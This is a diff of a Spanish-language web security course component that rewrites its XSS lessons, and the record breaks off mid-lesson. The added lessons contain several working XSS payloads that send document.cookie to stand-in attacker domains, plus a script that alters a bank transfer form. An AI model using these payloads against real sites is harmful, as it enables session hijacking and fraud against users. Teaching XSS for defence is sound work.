@@ -3,7 +3,6 @@ import { CommonModule } from '@angular/common';
 import { ActivatedRoute, Router } from '@angular/router';
 import { FontAwesomeModule } from '@fortawesome/angular-fontawesome';
 import { faCheckCircle } from '@fortawesome/free-solid-svg-icons';
-import hljs from 'highlight.js';
 import { LessonProgressService } from '../../../../services/lesson-progress.service';
 
 
@@ -46,2622 +45,3961 @@ export class LessonComponent implements OnInit {
   totalSections = 0;
 
   private categoryLessons = {
-    'security-basics': ['intro-seguridad', 'owasp-top-10'],
-    'xss': ['fundamentos-xss', 'tipos-xss', 'contextos-salida-xss', 'dom-xss-ejecucion-cliente', 'prevencion-xss', 'csp-y-headers', 'diseno-seguro-y-procesos', 'casos-avanzados-xss'],
-    'sqli': ['fundamentos-sqli', 'tipos-sqli', 'fundamentos-sql-y-acceso', 'raices-sqli', 'prevencion-sqli', 'arquitectura-operaciones', 'analisis-priorizacion-riesgo', 'casos-avanzados-sqli']
+    'security-basics': [
+      'intro-seguridad', 
+      'amenazas-vulnerabilidades', 
+      'fundamentos-tecnicos', 
+      'owasp-top-10', 
+      'modelo-amenazas-vectores', 
+      'impacto-operacional', 
+      'ciclo-seguro-devsecops'
+    ],
+    'xss': [
+      'fundamentos-xss', 
+      'tipos-xss', 
+      'contextos-vectores-xss', 
+      'ejemplos-xss', 
+      'evasion-xss', 
+      'prevencion-xss', 
+      'impacto-xss', 
+      'diseño-seguro-xss'
+    ],
+    'sqli': [
+      'fundamentos-sqli', 
+      'tipos-sqli', 
+      'ejemplos-sqli', 
+      'fingerprinting-dbms', 
+      'evasion-sqli', 
+      'prevencion-sqli', 
+      'impacto-sqli', 
+      'diseño-seguro-sqli'
+    ]
   };
 
   private lessonContent: { [key: string]: LessonData } = {
+    // Sección de fundamentos de XSS
     'fundamentos-xss': {
       id: 'fundamentos-xss',
       title: 'Fundamentos de XSS',
-      description: 'Aprende qué es Cross-Site Scripting, cómo funciona y por qué sigue siendo una de las vulnerabilidades más comunes en aplicaciones web modernas.',
+      description: '¿Qué es XSS y cómo funciona?',
       category: 'xss',
       htmlContent: `
-        <h2>Introducción</h2>
         <p>
-          Cross-Site Scripting (XSS) o <b> secuencias de comandos en sitios cruzados</b>, es una vulnerabilidad en aplicaciones web que permite a los atacantes inyectar código JavaScript malicioso en páginas visitadas por otros usuarios, comprometiendo su seguridad. Este tipo de ataques puede utilizarse para robar credenciales, secuestrar sesiones, redirigir usuarios a sitios maliciosos o manipular la funcionalidad de una aplicación web.
+          Cross-Site Scripting es una vulnerabilidad que permite insertar y ejecutar código JavaScript malicioso dentro del navegador de otros usuarios. Su importancia radica en que cualquier script ejecutado por el navegador tiene la capacidad de interactuar con la página como si fuera un usuario legítimo, acceder a cookies, tokens, contenido privado o incluso modificar la interfaz de la aplicación. XSS no afecta solamente a usuarios individuales, sino que compromete por completo la confianza entre el navegador y el servidor, alterando la integridad del contenido mostrado.
         </p>
 
         <p>
-          En general, XSS ocurre cuando una aplicación inserta datos proporcionados por un usuario en la salida HTML sin validarlos ni codificarlos de forma adecuada. El navegador del usuario no puede distinguir si ese código proviene del sitio confiable o de un atacante, por lo que termina ejecutándolo con los mismos privilegios del sitio legítimo. Esto abre la puerta a numerosas consecuencias maliciosas.
-        </p>
-        <h2>¿Por qué es peligrosa esta vulnerabilidad?</h2>
-        <p>
-           Porque el script inyectado se ejecuta como si fuera parte del sitio de confianza. En un ataque exitoso de XSS, el código del atacante puede hacer todo lo que podría hacer el código legítimo de la aplicación en el navegador de la víctima. Por ejemplo, un exploit XSS podría robar cookies de sesión del usuario (lo que permite secuestrar su cuenta), mostrar phishing engañoso, redirigir al usuario a otro sitio malicioso o incluso modificar visualmente el contenido de la página. Las posibilidades van desde simples molestias (como hacer aparecer ventanas emergentes inesperadas) hasta comprometer por completo la cuenta o los datos del usuario afectado.
+          La base del ataque consiste en lograr que el navegador ejecute código no previsto dentro de un contexto donde debería existir únicamente contenido generado por la aplicación. Esto ocurre cuando la entrada del usuario se inserta en la página sin sanitización suficiente, o cuando se procesa como HTML o JavaScript sin validación. Una vez que el atacante encuentra un lugar donde su script puede ser ejecutado, es posible robar sesiones, manipular solicitudes, registrar acciones del usuario o distribuir contenido malicioso.
         </p>
 
-        <h2>Explicación paso a paso del concepto</h2>
-        <p>Para entender cómo ocurre un ataque XSS, consideremos el siguiente flujo básico paso a paso:</p>
-        
-        <ol>
-          <li><strong>Inserción de datos maliciosos:</strong> El atacante encuentra un punto en la aplicación web que acepta entrada del usuario (por ejemplo, un campo de formulario, una URL con parámetros, un comentario en un foro, etc.). En lugar de un dato inocuo, el atacante ingresa código JavaScript o HTML malicioso. Esta es la carga útil (payload) del ataque.</li>
-          
-          <li><strong>Falta de sanitización en el servidor:</strong> El servidor web recibe esa entrada y, debido a una falla de seguridad, la incluye tal cual en la página de respuesta que genera, sin realizar la validación o codificación necesaria para neutralizar contenido activo. En otras palabras, la aplicación confía ciegamente en la entrada del usuario y la inserta en el HTML de la página dinámica.</li>
-          
-          <li><strong>Entrega del contenido al navegador:</strong> El navegador de la víctima carga la página web resultante desde el sitio legítimo. Esa página contiene el código del atacante incrustado dentro del HTML (por ejemplo, una etiqueta <code>&lt;script&gt;</code> maliciosa, un atributo con código JavaScript incrustado, etc.). Dado que el contenido proviene del dominio legítimo, el navegador asume que es de confianza y lo ejecuta.</li>
-          
-          <li><strong>Ejecución del código malicioso:</strong> El script inyectado se ejecuta en el navegador de la víctima con todos los privilegios del sitio. En este punto, el atacante puede realizar acciones como obtener datos sensibles (cookies, tokens de sesión, información personal), manipular el DOM de la página para mostrar contenido falso o engañoso, o incluso realizar peticiones en nombre del usuario (aprovechando su sesión activa). Todo ocurre sin que la víctima lo note, ya que el ataque suele ocurrir de forma silenciosa en segundo plano.</li>
-          
-          <li><strong>Resultado o impacto:</strong> Finalmente, el atacante logra su objetivo, que puede ser robar información del usuario, tomar control de su cuenta, propagar malware, llevar a cabo phishing dentro del sitio o cualquier otro acto malicioso. Después, el código malicioso puede incluso autodestruirse o permanecer oculto para dificultar su detección.</li>
-        </ol>
+        <h2>¿Cómo ocurre XSS en una aplicación?</h2>
 
         <p>
-          En suma, el atacante "inyecta" un fragmento de código en la aplicación vulnerable, y esa inyección viaja desde el servidor hasta el navegador víctima, donde se ejecuta con la autoridad del sitio web comprometido. Todo esto es posible porque la aplicación no manejó correctamente la entrada no confiable. En próximos módulos profundizaremos en dónde y cómo ocurren estas inyecciones (reflejadas, almacenadas, DOM) y en las técnicas para prevenirlas.
+          En una aplicación típica, XSS aparece cuando el servidor muestra datos proporcionados por el usuario de forma directa. Esto puede ocurrir en campos como comentarios, perfiles, formularios de contacto, parámetros de búsqueda o cualquier sección donde el usuario pueda ingresar información visible para otros. Cuando el contenido se refleja en la interfaz sin aplicar medidas de codificación o filtrado, el navegador interpreta el contenido como código legítimo.
         </p>
 
-        <h2>Ejemplo vulnerable</h2>
+        <p>Imagine un sistema de noticias accesible desde la ruta:</p>
+
+        <pre><code>https://sinembargo.com.mx/articulo?id=215</code></pre>
+
         <p>
-          Consideremos un ejemplo sencillo para ilustrar un XSS. Supongamos una página web que saluda al usuario por su nombre, tomando dicho nombre de los parámetros de la URL. Un código PHP vulnerable podría ser:
+          Si la aplicación muestra el valor del parámetro id en el título o en algún elemento HTML, y no valida correctamente el contenido, un atacante podría manipular la URL para reflejar un script. Por ejemplo:
         </p>
 
-        <pre><code>&lt;p&gt;Hola &lt;?php echo $_GET['nombre']; ?&gt;!&lt;/p&gt;</code></pre>
+        <pre><code>https://sinembargo.com.mx/articulo?id=&lt;script&gt;document.location='https://atacante.mx/robo?c='+document.cookie&lt;/script&gt;</code></pre>
 
         <p>
-          Aquí la página inserta directamente el valor del parámetro nombre dentro de un párrafo HTML. Si un atacante induce a la víctima a visitar la URL:
+          Si la aplicación inserta el parámetro <code>id</code> directamente en el HTML, el navegador interpretará el contenido como un script válido. Aunque el ejemplo es directo, aplicaciones reales han sufrido incidentes casi idénticos por confiar en parámetros que creían controlados.
         </p>
 
-        <pre><code>ejemplo.com/ejemplo.php?nombre=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
-
-        <p>el código resultante en la respuesta será:</p>
-
-        <pre><code>&lt;p&gt;Hola &lt;script&gt;alert('XSS')&lt;/script&gt;!&lt;/p&gt;</code></pre>
+        <h2>Ejemplo realista basado en formularios de comentarios</h2>
 
         <p>
-          El navegador interpretará la etiqueta <code>&lt;script&gt;</code> inyectada y ejecutará <code>alert('XSS')</code>. En un ataque real, en lugar de mostrar un simple <code>alert()</code>, el script podría robar la cookie de sesión (document.cookie) u otra acción maliciosa. Este ejemplo demuestra un XSS reflejado (que se envía en la URL y se "refleja" inmediatamente en la página).
+          Considere un foro de discusión donde los usuarios pueden dejar comentarios como parte de una noticia. La aplicación recibe texto enviado mediante un formulario y lo guarda en la base de datos. Al mostrar los comentarios, la aplicación inserta el contenido sin codificarlo correctamente.
+        </p>
+
+        <p>Un comentario malicioso podría lucir así:</p>
+
+        <pre><code>&lt;script&gt;
+  fetch('https://servidor-atacante.com/registro', {
+    method: 'POST',
+    body: document.cookie
+  });
+&lt;/script&gt;</code></pre>
+
+        <p>
+          Cuando otro usuario visite la página del artículo, el navegador ejecutará este script sin cuestionarlo, ya que proviene de contenido "válido" según la aplicación. El script envía sus cookies a un servidor remoto controlado por el atacante, permitiendo que este robe la sesión y acceda en nombre del usuario afectado.
         </p>
 
         <p>
-          Otro escenario común es un campo de comentarios en un blog. Imagina que un formulario permite publicar comentarios y el contenido se muestra sin sanitización. Un atacante podría enviar como comentario algo como:
+          Este tipo de incidente ha ocurrido en múltiples plataformas de comentarios y redes sociales antiguas antes de incorporar mecanismos de filtrado adecuados.
         </p>
 
-        <pre><code>&lt;script&gt;window.location='http://sitio-del-attacker/steal?cookie='+document.cookie&lt;/script&gt;</code></pre>
+        <h2>Inserción de XSS en atributos HTML</h2>
 
         <p>
-          Si la aplicación almacena ese comentario en la base de datos y luego lo presenta tal cual a cualquier visitante, cada usuario que vea la página ejecutará el script del atacante, enviando su cookie de sesión al servidor del atacante. Este sería un XSS almacenado (el código malicioso permanece en la aplicación hasta que es disparado). En ambos casos, la raíz del problema es la misma: la aplicación incrusta entrada del usuario en la salida sin tratarla adecuadamente.
+          En ocasiones el atacante no necesita insertar una etiqueta de script completa. Basta con encontrar un atributo HTML que permita ejecutar código. Esto puede ocurrir cuando la aplicación inserta texto dentro de atributos como <em>onclick</em>, <em>onmouseover</em> o incluso dentro de la ruta de una imagen o enlace.
         </p>
-
-        <h2>Ejemplo seguro</h2>
-        <p>
-          Veamos ahora cómo corregir el ejemplo anterior usando codificación/escape de caracteres especiales. La clave es asegurarse de que cualquier contenido proporcionado por el usuario se trate como texto literal, no como código HTML/JS ejecutable. En PHP, se puede usar la función <code>htmlspecialchars()</code> para escapar caracteres como &lt;, &gt;, " y '. Una versión segura del fragmento sería:
-        </p>
-
-        <pre><code>&lt;p&gt;Hola &lt;?php echo htmlspecialchars($_GET['nombre'], ENT_QUOTES, 'UTF-8'); ?&gt;!&lt;/p&gt;</code></pre>
 
         <p>
-          Ahora, si el parámetro nombre contiene <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, la función lo convertirá a <code>&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;</code>. El HTML resultante sería:
+          Un escenario típico podría encontrarse en un perfil de usuario donde el nombre se muestra dentro de un atributo title. Si el sistema no valida ni codifica adecuadamente este campo, un atacante podría introducir un valor como:
         </p>
 
-        <pre><code>&lt;p&gt;Hola &amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;!&lt;/p&gt;</code></pre>
+        <pre><code>" onmouseover="fetch('https://robo.mx/c?d='+document.cookie)</code></pre>
 
         <p>
-          El navegador mostrará literalmente <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> en la página, en lugar de ejecutarlo, ya que los caracteres <code>&lt;</code> y <code>&gt;</code> han sido reemplazados por sus entidades HTML seguras (<code>&amp;lt;</code> y <code>&amp;gt;</code>).
+          Cuando el usuario pase el cursor sobre el elemento, el script se ejecutará. Este tipo de ataque es especialmente peligroso en interfaces administrativas donde los administradores visualizan contenido generado por usuarios, permitiendo comprometer cuentas de alto privilegio.
         </p>
 
-        <h2>Errores comunes</h2>
-        <p>Al iniciar en seguridad web, es frecuente cometer algunas imprudencias o suposiciones incorrectas que conducen a vulnerabilidades XSS. Estos son algunos errores comunes:</p>
+        <h2>Inserción de XSS en contenido dinámico generado por JavaScript</h2>
 
+        <p>
+          Las aplicaciones modernas dependen de JavaScript para actualizar contenido sin recargar la página. En este contexto, XSS surge cuando se utilizan métodos como <code>innerHTML</code> para insertar directamente datos proporcionados por el usuario.
+        </p>
+
+        <p>Considere una tienda en línea en la ruta:</p>
+
+        <pre><code>https://compraseguras.mx/producto/458</code></pre>
+
+        <p>El frontend genera dinámicamente las reseñas con:</p>
+
+        <pre><code>document.getElementById('resena').innerHTML = datosUsuario.comentario</code></pre>
+
+        <p>Si un atacante publica una reseña como:</p>
+
+        <pre><code>&lt;p&gt;Excelente producto&lt;/p&gt;&lt;script&gt;document.location='https://fuga.mx/c?u='+document.cookie&lt;/script&gt;</code></pre>
+
+        <p>
+          el navegador ejecutará el script inmediatamente. A diferencia de ejemplos más simples, este escenario refleja aplicaciones reales donde el frontend, y no el backend, inserta contenido sin sanitización.
+        </p>
+
+        <h2>XSS almacenado en sistemas de mensajería</h2>
+
+        <p>
+          Los ataques XSS almacenados destacan por su persistencia. El script malicioso no depende de que el usuario haga clic en una URL específica; basta con visitar cualquier parte de la aplicación donde se muestre el contenido almacenado.
+        </p>
+
+        <p>Por ejemplo, imagine un sistema de mensajería interna:</p>
+
+        <pre><code>https://portal-corporativo.mx/mensajes/inbox</code></pre>
+
+        <p>Un mensaje malicioso podría contener:</p>
+
+        <pre><code>&lt;img src="no-existe" onerror="fetch('https://captura.mx/s?d='+document.cookie)"&gt;</code></pre>
+
+        <p>
+          El script se ejecutará cuando el destinatario abra su bandeja de entrada. Este tipo de abuso ha sido registrado en múltiples entornos empresariales donde la confianza interna facilita que un atacante comprometa cuentas de gerentes o administradores.
+        </p>
+
+        <h2>Abuso de XSS para modificar la interfaz de usuario</h2>
+
+        <p>
+          XSS no se limita a robar información. Un atacante puede manipular la interfaz para engañar al usuario. Por ejemplo, en una aplicación bancaria ubicada en:
+        </p>
+
+        <pre><code>https://clientes.banco-sereno.mx/transferencias</code></pre>
+
+        <p>Un script malicioso podría ser:</p>
+
+        <pre><code>&lt;script&gt;
+  document.getElementById('monto').value = '50000';
+  document.getElementById('cuenta').value = '9876543210';
+&lt;/script&gt;</code></pre>
+
+        <p>
+          El usuario podría ser inducido a confirmar una transferencia alterada sin notar el cambio. Este tipo de ataque replica incidentes reales en plataformas vulnerables donde el contenido dinámico no estaba protegido.
+        </p>
+
+        <h2>Bibliografía</h2>
         <ul>
-          <li><strong>Confiar en la entrada del usuario:</strong> Asumir que los usuarios (o los parámetros en URLs) solo enviarán datos benignos. Subestimar la creatividad de los atacantes es peligroso; cualquier campo, por inofensivo que parezca (nombre, mensaje, id, etc.), puede ser vehículo de código malicioso si no se maneja correctamente.</li>
+          <li>OWASP Foundation, Cross-Site Scripting. [Online]. Available:
+            <a href="https://owasp.org/www-community/attacks/xss" target="_blank">
+              https://owasp.org/www-community/attacks/xss
+            </a>
+          </li>
 
-          <li><strong>Filtrado insuficiente o incorrecto:</strong> Intentar "sanear" la entrada usando listas negras de palabras o etiquetas (por ejemplo, bloqueando la palabra <code>&lt;script&gt;</code> y nada más). Este enfoque es frágil y fácil de evadir, un atacante puede usar otras etiquetas (ej. <code>&lt;img onerror="..."&gt;</code>), codificaciones alternativas o incluso casos de mayúsculas/minúsculas para escapar del filtro.</li>
+          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Wiley Publishing, 2011.</li>
 
-          <li><strong>No escapar la salida según el contexto:</strong> Un error crítico es olvidar codificar/escapar los caracteres especiales al insertar datos dinámicos en HTML. Cada contexto (HTML, atributo, JavaScript, etc.) requiere un tipo de escape distinto.</li>
-          
-          <li><strong>Creer que ciertas circunstancias "eliminan" el riesgo:</strong> Por ejemplo, suponer que si un formulario usa método POST en lugar de GET, entonces no es vulnerable a XSS. En realidad, un atacante puede explotar XSS también mediante solicitudes POST.</li>
-          
-          <li><strong>Ignorar fuentes menos obvias de entrada:</strong> A veces se piensa que solo los campos de formulario o parámetros URL son entrada de usuario. Pero también lo son las cookies, el contenido de cargas de archivos, los valores almacenados en bases de datos provenientes de usuarios, e incluso datos de terceros.</li>
+          <li>Google Security Blog, XSS Prevention Cheat Sheet. [Online]. Available:
+            <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
+              https://developers.google.com/web/fundamentals/security
+            </a>
+          </li>
+
+          <li>PortSwigger, Cross-Site Scripting. [Online]. Available:
+            <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">
+              https://portswigger.net/web-security/cross-site-scripting
+            </a>
+          </li>
         </ul>
-
-        <h2>Buenas prácticas</h2>
-        <p>Para sentar unos fundamentos sólidos, resumamos algunas buenas prácticas iniciales para evitar XSS:</p>
-
-        <ul>
-          <li><strong>Asume que toda entrada es maliciosa hasta probar lo contrario:</strong> Adopta siempre una postura defensiva con los datos del usuario. Desde el diseño mismo de la aplicación, identifica qué entradas provienen de usuarios o fuentes no confiables y planifica cómo validarlas/limpiarlas.</li>
-          
-          <li><strong>Valida la entrada (Entrada confiable):</strong> Define reglas claras de validación para los datos que esperas. Rechaza o sanitiza cualquier cosa que no cumpla con el formato esperado. Esto por sí solo no detiene XSS en todos los casos, pero reduce la superficie de ataque.</li>
-          
-          <li><strong>Escapa/Codifica la salida (Salida segura):</strong> Esta es la medida más efectiva. Cada vez que muestres información que originalmente proviene de un usuario, aplícale codificación según el contexto donde irá (HTML, atributo, JavaScript, CSS, URL).</li>
-          
-          <li><strong>Utiliza las herramientas del lenguaje/framework:</strong> No reinventes la rueda. Usa funciones o librerías ya probadas para sanitización. Para casos donde necesites permitir cierto HTML, emplea librerías de sanitización que eliminen etiquetas/atributos peligrosos.</li>
-          
-          <li><strong>Mantente informado y aplica parches:</strong> Muchas vulnerabilidades XSS provienen de componentes o bibliotecas de terceros. Mantén tu stack actualizado y atento a boletines de seguridad.</li>
-        </ul>
-
-        <h2>Resumen</h2>
-        <p>
-          En este módulo vimos que Cross-Site Scripting es una vulnerabilidad que aprovecha la falta de manejo adecuado de entradas de usuario para inyectar scripts maliciosos en páginas web legítimas. XSS permite a atacantes ejecutar código en el navegador de las víctimas, con el potencial de comprometer cuentas, robar información sensible y alterar la funcionalidad del sitio.
-        </p>
-        
-        <p>
-          La raíz del problema es insertar datos no confiables en la salida HTML sin la debida validación/escape. Presentamos ejemplos de cómo ocurre un XSS y cómo se puede mitigar mediante el escape correcto de caracteres. También enumeramos errores comunes y enfatizamos buenas prácticas iniciales: validar entradas, escapar salidas y estar siempre vigilantes.
-        </p>
       `
     },
     'tipos-xss': {
       id: 'tipos-xss',
       title: 'Tipos de XSS',
-      description: 'Explora los tres tipos principales de XSS: reflejado, almacenado y basado en DOM, comprendiendo cómo se manifiestan y qué los diferencia.',
+      description: 'Clasificación y características de los distintos tipos de XSS.',
       category: 'xss',
       htmlContent: `
-        <h2>Introducción</h2>
-        <p>
-          No todos los ataques XSS ocurren de la misma forma. Existen tres variantes principales de XSS reconocidas comúnmente, determinadas por la manera en que el código malicioso ingresa y se distribuye a las víctimas:
-        </p>
-        
-        <ol>
-          <li><strong>XSS Reflejado (No persistente):</strong> el código malicioso viaja "reflejado" en la respuesta inmediata del servidor, normalmente a través de parámetros en una URL o formulario.</li>
-          <li><strong>XSS Almacenado (Persistente):</strong> el código malicioso se almacena en el servidor (por ejemplo, en una base de datos) y luego se sirve a múltiples usuarios, persistiendo en la aplicación.</li>
-          <li><strong>XSS basado en DOM:</strong> la vulnerabilidad reside completamente en el lado del cliente; el código malicioso se inyecta y ejecuta manipulando el DOM en el navegador, sin necesidad de respuesta del servidor con el script incrustado.</li>
-        </ol>
-
-        <p>
-          Cada tipo tiene escenarios de ataque y consideraciones ligeramente distintas. A continuación, describiremos cada uno en detalle, con ejemplos de cómo se explotan y cómo identificarlos.
-        </p>
-
-        <h2>XSS Reflejado (Reflected XSS)</h2>
-        <p>
-          El XSS reflejado ocurre cuando la aplicación refleja inmediatamente la entrada proporcionada por el atacante en la respuesta HTTP. Suele darse en páginas que muestran contenido dinámico basado en parámetros de la petición (por ejemplo, resultados de búsqueda, mensajes de error, etc.). El atacante envía a la víctima un enlace especialmente formulado o la induce a enviar un formulario con datos maliciosos, de modo que cuando la víctima carga esa URL, el servidor incluye el payload en la página y se ejecuta en su navegador.
-        </p>
-
-        <p>Para ilustrarlo, imaginemos un sitio con una página de búsqueda cuya URL es:</p>
-        <pre><code>https://victima.com/buscar?query=algo</code></pre>
-
-        <p>y el resultado muestra: "Búsqueda: algo". Si el sitio es vulnerable, un atacante podría crear un enlace así:</p>
-        <pre><code>https://victima.com/buscar?query=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
-
-        <p>
-          Cuando la víctima hace clic, el servidor inserta <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> en la página de resultados sin sanitizar, provocando la ejecución del alert. El ataque es "reflejado" porque el script viaja hasta el servidor y de vuelta en la misma solicitud/respuesta. Estos ataques generalmente requieren ingeniería social: el atacante necesita engañar al usuario para que haga clic en un enlace malicioso o visite una URL tramposa (por ejemplo, mediante un correo electrónico, mensaje o un link en otro sitio).
-        </p>
-
-        <h3>Ejemplo vulnerable (Reflejado)</h3>
-        <p>Supongamos un código simplificado en Node.js/Express:</p>
-
-        <pre><code class="language-javascript highlight-vulnerable">// Vulnerable: refleja directamente el parámetro 'nombre' en la respuesta HTML
-app.get('/saludo', (req, res) => {
-    const nombre = req.query.nombre;
-    res.send(\`&lt;h1&gt;Hola \${nombre}!&lt;/h1&gt;\`);
-});</code></pre>
-
-        <p>
-          Si un usuario ingenuo ingresa su nombre, la página funciona correctamente. Pero un atacante puede enviar <code>nombre=&lt;script&gt;robaCookie()&lt;/script&gt;</code> en la URL. El servidor incorporará ese string en el HTML y el navegador de la víctima ejecutará <code>robaCookie()</code> (una función definida por el atacante para exfiltrar datos, por ejemplo).
-        </p>
-
-        <h3>Ejemplo seguro</h3>
-        <p>La solución es escapar el parámetro antes de incluirlo. Podríamos utilizar una función de escape:</p>
-
-        <pre><code class="language-javascript highlight-secure">const escapeHTML = str => str
-  .replace(/&/g, "&amp;")
-  .replace(/</g, "&lt;")
-  .replace(/>/g, "&gt;")
-  .replace(/"/g, "&quot;")
-  .replace(/'/g, "&#x27;");
-
-app.get('/saludo', (req, res) => {
-    const nombre = req.query.nombre;
-    res.send(\`&lt;h1&gt;Hola \${escapeHTML(nombre)}!&lt;/h1&gt;\`);
-});</code></pre>
-
-        <p>
-          Ahora, cualquier <code>&lt;script&gt;</code> u otra etiqueta se convertirá en texto inocuo (<code>&lt;</code> se convierte en <code>&amp;lt;</code>, etc.), evitando la ejecución de código en el navegador.
-        </p>
-
-        <h3>Detección</h3>
-        <p>
-          Un síntoma de XSS reflejado es que el payload debe aparecer en la propia URL o petición enviada. Si al probar manualmente colocando <code>"&lt;script&gt;alert(1)&lt;/script&gt;</code> en un parámetro vemos que aparece un alert, o inspeccionamos el HTML devuelto y allí está nuestra cadena sin escapar, la página es vulnerable. Las pruebas de penetración suelen incluir esta técnica para identificar XSS reflejados.
-        </p>
-
-        <h2>XSS Almacenado (Stored XSS)</h2>
-        <p>
-          En el XSS almacenado, el atacante consigue que su código malicioso se guarde permanentemente en la aplicación objetivo (por ejemplo en una base de datos, archivo de registro, sistema de comentarios, perfil de usuario, etc.). Luego, cada vez que otro usuario carga la parte del sitio que muestra ese contenido almacenado, el script malicioso se entrega y ejecuta en sus navegadores. Debido a que el payload persiste en el servidor, este tipo de XSS puede afectar a múltiples usuarios sin que cada uno tenga que hacer clic en un enlace especial.
-        </p>
-
-        <h3>Vectores comunes</h3>
-        <p>
-          Foros, secciones de comentarios, paneles de administración, campos de perfil (como "Nombre" o "Firma") son terreno fértil para XSS almacenado. Por ejemplo, imaginemos un foro donde los usuarios pueden publicar mensajes. Un atacante publica un mensaje que contiene <code>&lt;script&gt;...malicioso...&lt;/script&gt;</code>. Si la aplicación no limpia esa entrada al guardarla o mostrarla, todos los que vean el mensaje ejecutarán el script.
+              <p>
+          Cross-Site Scripting puede manifestarse de diferentes formas dependiendo de cómo la aplicación procesa los datos proporcionados por el usuario. Aunque el resultado final es siempre la ejecución de código en el navegador de la víctima, la manera en que dicho script llega a ocurrir define tres categorías clásicas: XSS reflejado, XSS almacenado y XSS basado en DOM. Cada variante opera bajo mecanismos distintos, afecta a diferentes partes de la aplicación y requiere estrategias específicas de prevención.
         </p>
 
         <p>
-          Otro caso típico es una sección "Contacto" donde lo que se envía queda registrado en una interfaz de administración: el atacante envía un mensaje con código malicioso y cuando el administrador abre el panel para leerlo, su navegador ejecuta el ataque (esto se conoce a veces como XSS ciego, pues el atacante no ve directamente el resultado, pero afecta a otra víctima como un admin).
+          Comprender la diferencia entre estos tipos es fundamental para analizar correctamente un sistema y elegir las medidas necesarias para protegerlo. A continuación, se detallan ejemplos totalmente realistas, con comportamientos idénticos a los que encuentran los evaluadores de seguridad en aplicaciones reales.
         </p>
 
-        <h3>Ejemplo vulnerable (Almacenado)</h3>
-        <p>Supongamos una aplicación con un muro de comentarios:</p>
-
-        <pre><code class="language-javascript highlight-vulnerable">app.post('/comentarios', (req, res) => {
-    const comentario = req.body.texto;
-    db.save('comentarios', comentario);  // guarda el comentario tal cual
-    res.redirect('/ver-comentarios');
-});
-
-app.get('/ver-comentarios', (req, res) => {
-    const lista = db.getAll('comentarios');
-    let html = "&lt;h2&gt;Comentarios:&lt;/h2&gt;";
-    lista.forEach(c => {
-        html += \`&lt;p&gt;\${c}&lt;/p&gt;\`;  // inserta cada comentario sin escape
-    });
-    res.send(html);
-});</code></pre>
+        <h2>XSS reflejado</h2>
 
         <p>
-          Si un atacante envía como comentario <code>&lt;img src=x onerror="alert('XSS')"&gt; ¡Buen sitio!</code>, el código se almacenará. Cuando otros usuarios carguen <code>/ver-comentarios</code>, el código <code>&lt;img src=x onerror="..."&gt;</code> se incrustará en la página y disparará el <code>alert('XSS')</code> en sus navegadores (o cualquier otra acción maliciosa que se definiera, como robo de cookies).
+          El XSS reflejado ocurre cuando los datos enviados por el usuario son devueltos inmediatamente por el servidor dentro de la respuesta sin pasar por un proceso adecuado de sanitización o codificación. Este tipo de ataque se presenta principalmente mediante parámetros en la URL o en solicitudes donde la aplicación procesa valores que no se almacenan de forma persistente.
         </p>
 
         <p>
-          Nótese que aquí no hizo falta enviar enlaces con scripts a cada usuario; el ataque "vive" en la página misma.
+          Un escenario común ocurre en sistemas de búsqueda interna. Imagine un portal de artículos ubicado en:
         </p>
 
-        <h3>Ejemplo seguro</h3>
-        <p>La mitigación implica nuevamente validar y escapar. Idealmente, sanitizar al guardar (por ejemplo, eliminar etiquetas no permitidas) y escapar al mostrar. Aplicando escape de salida en el ejemplo:</p>
-
-        <pre><code class="language-javascript highlight-secure">// ...existing code...
-lista.forEach(c => {
-    html += \`&lt;p&gt;\${escapeHTML(c)}&lt;/p&gt;\`;
-});
-res.send(html);</code></pre>
-
+        <pre><code class="language-html highlight-vulnerable">https://articulos-ciudadanos.mx/buscar?query=clima</code></pre>
+      
         <p>
-          Donde <code>escapeHTML</code> es similar a la función definida antes. Así, aunque un atacante guarde <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, al renderizar se convertirá en texto literal inocuo. Adicionalmente, podría implementarse una validación que rechace contenido que parezca código (por ejemplo, prohibir <code>&lt;&gt;</code> en comentarios, o utilizar una lista blanca de etiquetas permitidas como <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code> si se desea formato básico).
+          Si el servidor inserta el valor del parámetro query en el HTML para mostrar el término buscado, un atacante podría generar un enlace malicioso que refleje un script en la respuesta. Por ejemplo:
         </p>
 
-        <h3>Impacto y detección</h3>
+        <pre><code>https://articulos-ciudadanos.mx/buscar?query=&lt;script&gt;fetch('https://captura.mx/c?d='+document.cookie)&lt;/script&gt;</code></pre>
+
         <p>
-          El XSS almacenado suele ser más grave que el reflejado, ya que puede afectar a muchos usuarios y perdurar hasta ser eliminado. Un atacante podría robar las sesiones de todos los visitantes de una página comprometida, o propagar un gusano XSS (script que se auto-replica publicando más mensajes maliciosos).
+          Si la aplicación coloca directamente el parámetro dentro del HTML, entonces el navegador interpretará el contenido como un script válido. La víctima solo necesita hacer clic en el enlace para que el ataque se ejecute. Esto hace que el XSS reflejado sea uno de los métodos más utilizados en campañas de phishing y ataques dirigidos que dependen de la interacción del usuario.
         </p>
 
         <p>
-          Para detectar este tipo de fallo, es útil probar ingresando contenido malicioso en campos que se muestren a otros usuarios y verificar si aparece sin sanitizar. Las pruebas deben incluir distintas cuentas de usuario para ver si un input se refleja en otra vista. También se recomienda revisar el código del lado servidor donde se almacenan y recuperan datos para asegurarse de que allí se aplica sanitización/escape.
+          Otro ejemplo frecuente ocurre en aplicaciones que muestran errores directamente. Si un formulario devuelve un mensaje que incluye datos enviados por el usuario, como:
         </p>
 
-        <h2>XSS Basado en DOM (DOM-based XSS)</h2>
+        <pre><code>Error: el usuario &lt;script&gt;alert('XSS')&lt;/script&gt; no existe.</code></pre>
+
         <p>
